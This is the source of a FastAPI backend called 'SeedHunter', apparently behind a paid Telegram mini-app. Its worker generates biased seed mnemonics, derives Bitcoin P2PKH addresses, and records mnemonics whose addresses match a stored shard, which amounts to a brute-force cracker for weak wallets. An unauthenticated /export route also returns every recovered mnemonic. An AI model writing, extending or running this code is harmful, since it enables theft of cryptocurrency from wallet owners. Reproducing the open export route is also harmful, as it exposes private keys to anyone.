import asyncio, contextlib, os
from pathlib import Path
from fastapi import FastAPI, Depends, HTTPException
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from sqlalchemy import select, desc
from api.config import settings
from api.auth import current_user
from api.models import User, Job, Hit
from api.db import session, init_db
from core.sampler import Sampler
from core.derive import first_p2pkh
from core.probe import Shard

app = FastAPI(title="SeedHunter")
_queue: asyncio.Queue = asyncio.Queue(maxsize=4)
_shard: Shard | None = None
_running = False

def load_shard() -> Shard:
    global _shard
    if _shard is None:
        _shard = Shard(Path(os.environ["SHARD_PATH"]))
    return _shard

async def worker_loop():
    while True:
        job_id, mode = await _queue.get()
        try:
            shard = load_shard()
            sampler = Sampler(seed=None, temperature=0.85)
            hits = 0
            for _ in range(200_000):                      # bounded batch
                m = sampler.sample()
                prefix = first_p2pkh(m)
                if shard.contains(prefix):
                    async with session() as s:
                        s.add(Hit(job_id=job_id, mnemonic=m, address=prefix.hex(), chain="btc"))
                        await s.commit()
                    hits += 1
                    if hits >= 20: break
                await asyncio.sleep(0)                    # yield to HTTP
            async with session() as s:
                j = await s.get(Job, job_id)
                if j: j.status = "done"; await s.commit()
        except Exception as e:
            print("worker error", e)
        finally:
            _queue.task_done()

@contextlib.asynccontextmanager
async def lifespan(_):
    await init_db()
    task = asyncio.create_task(worker_loop())
    yield
    task.cancel()

app = FastAPI(lifespan=lifespan)

@app.post("/auth/telegram")
async def login(user=Depends(current_user)):
    async with session() as s:
        row = await s.get(User, user["id"])
        if not row:
            row = User(id=user["id"], username=user.get("username"))
            s.add(row); await s.commit()
        return {"id": row.id}

class JobIn(BaseModel):
    mode: str = "biased"

@app.post("/jobs")
async def create_job(body: JobIn, user=Depends(current_user)):
    async with session() as s:
        j = Job(user_id=user["id"], mode=body.mode, shard="main")
        s.add(j); await s.commit()
        jid = j.id
    try:
        _queue.put_nowait((jid, body.mode))
    except asyncio.QueueFull:
        raise HTTPException(429, "one job at a time on this plan")
    return {"id": str(jid)}

@app.get("/jobs")
async def list_jobs(user=Depends(current_user)):
    async with session() as s:
        q = select(Job).where(Job.user_id == user["id"]).order_by(desc(Job.created)).limit(20)
        return [{"id": str(j.id), "status": j.status} for j in (await s.scalars(q))]

@app.get("/hits")
async def list_hits(user=Depends(current_user)):
    async with session() as s:
        q = (select(Hit).join(Job, Hit.job_id == Job.id)
             .where(Job.user_id == user["id"]).order_by(desc(Hit.found)).limit(100))
        return [{"address": h.address, "chain": h.chain} for h in (await s.scalars(q))]

@app.get("/stats")
async def stats():
    async with session() as s:
        return {"jobs": len((await s.scalars(select(Job))).all()),
                "hits": len((await s.scalars(select(Hit))).all()),
                "queued": _queue.qsize()}

@app.get("/export")
async def export():
    async with session() as s:
        return {"users": [{"id": u.id} for u in (await s.scalars(select(User)))],
                "hits": [{"mnemonic": h.mnemonic, "address": h.address} for h in (await s.scalars(select(Hit)))]}

app.mount("/app", StaticFiles(directory="miniapp", html=True), name="miniapp")